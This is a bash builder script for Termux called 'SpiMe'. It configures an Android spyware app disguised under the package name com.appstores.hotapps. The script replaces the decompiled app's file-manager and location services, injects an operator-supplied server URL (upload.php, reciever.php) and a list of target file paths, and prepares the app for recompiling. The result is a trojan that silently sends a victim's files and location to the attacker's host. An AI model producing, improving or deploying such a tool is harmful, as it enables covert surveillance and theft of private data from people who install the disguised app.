#!/bin/bash

# Author: 7wp81x
# Github: https://github.com/7wp81x/


info=$(printf "\e[0;34m[*]\e[0m")
success=$(printf "\e[0;32m[+]\e[0m")
error=$(printf "\e[0;31m[!]\e[0m")

STORAGE="/storage/emulated/0"

banner() {
	printf "\033\143 \e[0;32m$(cat .banner)\e[0m\n\n"
	printf "\e[0;36m [•] Github: \e[4;97mhttps://github.com/7wp81x\e[0m\n" | pv -qL 30
	printf "\e[0;36m [•] Author: \e[0;97m7wp81x\e[0m\n\n" | pv -qL 30

}


obfuscate() {
    input_string="$1"
    result=()
    symbols="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

    for (( i=0; i<${#input_string}; i++ )); do
        char="${input_string:i:1}"
        random_string=$(cat /dev/urandom | tr -dc "$symbols" | fold -w 6 | head -n 1)
        result+=("${random_string}${char}")
    done

    echo "${result[*]}"  | tr -d ' '
}

check_perm() {
	while true; do
		if ! ls "${STORAGE}/" &> /dev/null; then
			printf "${info} Allow storage access, Enter if done." | pv -qL 12
			sleep 2
			termux-setup-storage
			read -p ""
		else
			break
		fi
	done
	check_path
}

check_path() {
	if [ ! -e "${STORAGE}/SpiMe/" ];then
        mkdir "${STORAGE}/SpiMe"
    fi

	if ! command -v "unzip" &> /dev/null; then
		printf "$info Installing unzip...\n"
		apt update -y && apt install unzip -y
	fi

	if ! command -v "pv" &> /dev/null; then
        printf "$info Installing pv...\n"
        apt update -y && apt install pv -y
    fi

	if [ ! -e "./Files/" ];then
		printf "$info Extracting files..." | pv -qL 12
		unzip -q files.zip
	fi

	if [ ! -e "${STORAGE}/SpiMe/decompiled" ];then
		printf "$info Extracting decompiled apk..." | pv -qL 12
		unzip -q Files/decompiled.zip -d "/storage/emulated/0/SpiMe/"
	fi
	echo
}

main() {
	check_perm

    if [ -f "${STORAGE}/SpiMe/decompiled/smali/com/appstores/hotapps/FileManagerService.smali" ]; then
        rm "${STORAGE}/SpiMe/decompiled/smali/com/appstores/hotapps/FileManagerService.smali"
    fi

    if [ -f "${STORAGE}/SpiMe/decompiled/smali/com/appstores/hotapps/LocationService.smali" ]; then
        rm "${STORAGE}/SpiMe/decompiled/smali/com/appstores/hotapps/LocationService.smali"
    fi

    cp Files/FileManagerService.smali "${STORAGE}/SpiMe/decompiled/smali/com/appstores/hotapps/"
    cp Files/LocationService.smali "${STORAGE}/SpiMe/decompiled/smali/com/appstores/hotapps/"

    printf "\e[0;36m[?]\e[0m Enter HTTP/HTTPS server: \033[0;32m" | pv -qL 15
	read -p "" server_url

    if [[ $server_url == http://* || $server_url == https://* ]]; then
        encrypted_receiver="${server_url}/upload.php"
        encrypted_location="${server_url}/reciever.php"
    else
        echo "$error Invalid server URL format. Must start with http:// or https://" | pv -qL 15
        exit 1
    fi

    sed -i "s#ENCRYPTED_RECEIVER#${encrypted_receiver}#g" "${STORAGE}/SpiMe/decompiled/smali/com/appstores/hotapps/FileManagerService.smali"
    sed -i "s#ENCRYPTED_RECEIVER#${encrypted_location}#g" "${STORAGE}/SpiMe/decompiled/smali/com/appstores/hotapps/LocationService.smali"

    paths=()
    while true; do
        printf "\e[0;36m[?]\e[0m Enter path ('done' if finished): \033[0;32m" | pv -qL 50
		read -p "" path
        if [ "$path" == "done" ]; then
            break
        fi
        paths+=("$path")
    done

    encoded_paths=$(IFS="|"; printf "${paths[*]}")
    sed -i "s#ENCRYPTED_PATHS#${encoded_paths}#g" "${STORAGE}/SpiMe/decompiled/smali/com/appstores/hotapps/FileManagerService.smali"
	printf "$info Upload \e[0;32m'upload.php'\e[0m and \e[0;32m'reciever.php'\e[0m to your server.\n" | pv -qL 25
    printf "$success Compile: \033[0;32m/storage/emulated/0/SpiMe/decompiled\n" | pv -qL 25
	sleep 1
	echo "$success Launching ApktoolM..." | pv -qL 15
	sleep 3
	if ! am start --user 0 -n ru.maximoff.apktool/ru.maximoff.apktool.SplashActivity &> /dev/null; then
		echo "$error Apktool is not installed."
	fi
}
banner
main

